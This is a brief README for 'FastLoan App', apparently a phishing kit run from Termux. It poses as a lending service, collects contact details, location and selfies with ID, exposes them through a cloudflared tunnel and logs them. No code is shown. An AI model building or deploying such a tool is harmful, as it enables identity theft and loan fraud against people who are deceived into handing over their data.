# FastLoan App
A digital lending app with biometric verification.

## Features
1. Loan product selection
2. User data collection (name, phone, email, city)
3. Biometric verification (location + selfie with ID)
4. Cloudflared tunnel for public URL
5. Data logging (saves data + selfie)

## Dependencies
- `python`
- `cloudflared`
- `flask`
- `colorama`

## Setup (Termux/Proot)
```bash
pkg install python cloudflared
pip install flask colorama
python app.py
